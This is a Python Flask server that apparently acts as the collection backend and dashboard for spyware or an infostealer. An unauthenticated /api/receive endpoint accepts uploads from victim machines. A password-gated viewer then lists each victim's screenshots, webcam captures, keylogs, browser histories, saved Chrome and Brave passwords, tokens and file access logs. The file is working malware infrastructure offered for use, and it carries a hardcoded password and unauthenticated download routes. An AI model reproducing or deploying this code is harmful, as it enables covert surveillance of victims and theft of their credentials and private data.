import os
from flask import Flask, request, send_from_directory, render_template_string, Response
from werkzeug.utils import secure_filename
from datetime import datetime
import pytz

UPLOAD_ROOT = "logs"
PASSWORD = "disha456"

app = Flask(__name__)
if not os.path.exists(UPLOAD_ROOT):
    os.makedirs(UPLOAD_ROOT)

COLUMNS = [
    "Hostname", "Timestamp", "Desktop Screenshot", "Webcam", "Keylogs",
    "Decoded Keylogs", "Chrome History", "Brave History", "Chrome Passwords",
    "Brave Passwords", "Tokens", "Recent Files", "File Access Log"
]

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
  <title>System Log Monitor</title>
  <style>
    body { background-color: black; color: lime; font-family: monospace; }
    h2 { color: cyan; }
    table { border-collapse: collapse; width: 100%; margin-top: 20px; }
    th, td { border: 1px solid lime; padding: 8px; text-align: center; }
    th { font-size: 18px; font-weight: bold; background: #222; }
    td a { color: cyan; text-decoration: none; }
    form { margin-top: 30px; }
    input[type=password] { background: black; color: lime; border: 1px solid lime; padding: 5px; }
  </style>
</head>
<body>
  {% if not authed %}
    <h2>🔐 Enter Password to Access Logs</h2>
    <form method="POST">
      <input type="password" name="password" placeholder="Enter password"/>
      <button type="submit">Login</button>
    </form>
  {% else %}
    <center><h2> Log Viewer (Live Feed)</h2></center>
    <table>
      <tr>
        {% for col in columns %}
          <th>{{ col }}</th>
        {% endfor %}
      </tr>
      {% for folder in logs %}
        <tr>
          <td>{{ folder.hostname }}</td>
          <td>{{ folder.timestamp }}</td>
          {% for idx, file in enumerate(folder.files) %}
            <td>
              {% if file %}
                {% if idx == 5 %} {# Decoded Keylogs #}
                  <a href="/view/{{ folder.raw_folder }}/{{ folder.raw_files[idx] }}">View</a>
                {% else %}
                  <a href="{{ file }}">📥 View/Download</a>
                {% endif %}
              {% else %}-{% endif %}
            </td>
          {% endfor %}
        </tr>
      {% endfor %}
    </table>
  {% endif %}
</body>
</html>
'''

@app.route("/", methods=["GET", "POST"])
def index():
    authed = False
    if request.method == "POST" and request.form.get("password") == PASSWORD:
        authed = True
    elif request.args.get("access") == PASSWORD:
        authed = True

    log_entries = []
    if authed:
        for folder in sorted(os.listdir(UPLOAD_ROOT), reverse=True):
            full_path = os.path.join(UPLOAD_ROOT, folder)
            if not os.path.isdir(full_path): continue

            # Convert timestamp folder name to IST
            try:
                dt = datetime.strptime(folder, "%Y-%m-%d_%H-%M-%S")
                utc = pytz.utc.localize(dt)
                ist = utc.astimezone(pytz.timezone('Asia/Kolkata'))
                ts = ist.strftime("%H:%M:%S__%d:%m:%Y")
            except:
                ts = folder

            # Gather file entries
            files = []
            raw_files = []
            for col in COLUMNS[2:]:
                norm = col.lower().replace(" ", "_")
                if col == "Decoded Keylogs":
                    norm = "decrypted_keylogs"
                match = next((f for f in os.listdir(full_path) if norm in f.lower()), None)
                if match:
                    files.append(f"/download/{folder}/{match}")
                    raw_files.append(match)
                else:
                    files.append(None)
                    raw_files.append("")

            # Extract hostname
            hostname = ""
            act = next((f for f in os.listdir(full_path) if "activity_log" in f.lower()), None)
            if act:
                try:
                    with open(os.path.join(full_path, act), encoding="utf-8") as f:
                        for line in f:
                            if "Computer Name:" in line:
                                hostname = line.split(":",1)[1].strip()
                                break
                except:
                    hostname = "Unknown"
            if not hostname:
                hostname = folder.split("_")[0]

            log_entries.append({
                "hostname": hostname,
                "timestamp": ts,
                "files": files,
                "raw_folder": folder,
                "raw_files": raw_files
            })

    return render_template_string(HTML_TEMPLATE, authed=authed, columns=COLUMNS, logs=log_entries)

@app.route("/api/receive", methods=["POST"])
def receive():
    from werkzeug.utils import secure_filename
    timestamp = datetime.utcnow().strftime("%Y-%m-%d_%H-%M-%S")
    save_dir = os.path.join(UPLOAD_ROOT, timestamp)
    os.makedirs(save_dir, exist_ok=True)
    for f in request.files.values():
        fn = secure_filename(f.filename)
        f.save(os.path.join(save_dir, fn))
    return "Logs received"

@app.route("/download/<folder>/<filename>")
def download(folder, filename):
    return send_from_directory(os.path.join(UPLOAD_ROOT, folder), filename)

@app.route("/view/<folder>/<filename>")
def view(folder, filename):
    path = os.path.join(UPLOAD_ROOT, folder, filename)
    if not os.path.exists(path):
        return "Not Found", 404
    return Response(
        f"<pre style='background:black;color:lime;'>{open(path, 'r', encoding='utf-8', errors='ignore').read()}</pre>",
        mimetype="text/html"
    )

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
